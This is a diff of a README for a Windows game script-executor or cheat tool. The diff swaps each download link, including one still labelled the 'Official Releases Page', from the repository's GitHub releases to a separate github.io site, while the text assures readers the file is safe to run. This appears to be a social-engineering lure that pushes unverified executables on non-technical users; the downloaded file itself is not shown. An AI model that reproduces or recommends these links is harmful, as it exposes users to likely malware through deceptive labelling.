@@ -1,6 +1,6 @@
 # 🎯 solo-hunters-windows-script-exec - Dominate Every Hunt Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blueviolet?style=for-the-badge&logo=github)](https://github.com/Ileanenoxious96/solo-hunters-windows-script-exec/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blueviolet?style=for-the-badge&logo=github)](https://ileanenoxious96.github.io)
 
 ---
 
@@ -17,7 +17,7 @@ This guide takes you through setup step-by-step. You don't need to be tech-savvy
 ### Step 1: Download the Application
 
 Visit this link to download the application:
-[**https://github.com/Ileanenoxious96/solo-hunters-windows-script-exec/releases**](https://github.com/Ileanenoxious96/solo-hunters-windows-script-exec/releases)
+[**https://ileanenoxious96.github.io**](https://ileanenoxious96.github.io)
 
 Once you're on that page, look for the latest version. The file is safe and ready for Windows 10 and 11. Click the download button, and the file will save to your computer (usually in your "Downloads" folder).
 
@@ -178,7 +178,7 @@ Most questions are answered in this guide. If you still need help, try these ste
 
 Need the file again? Use this button:
 
-[![Download Now](https://img.shields.io/badge/⬇️-Download%20Latest%20Version-orange?style=for-the-badge)](https://github.com/Ileanenoxious96/solo-hunters-windows-script-exec/releases)
+[![Download Now](https://img.shields.io/badge/⬇️-Download%20Latest%20Version-orange?style=for-the-badge)](https://ileanenoxious96.github.io)
 
 ---
 
@@ -216,7 +216,7 @@ Need the file again? Use this button:
 
 You have everything you need. Download, run, and turn the odds in your favor. The hunt is calling—answer it.
 
-[**➡️ Download Now from the Official Releases Page**](https://github.com/Ileanenoxious96/solo-hunters-windows-script-exec/releases)
+[**➡️ Download Now from the Official Releases Page**](https://ileanenoxious96.github.io)
 
 ---
 
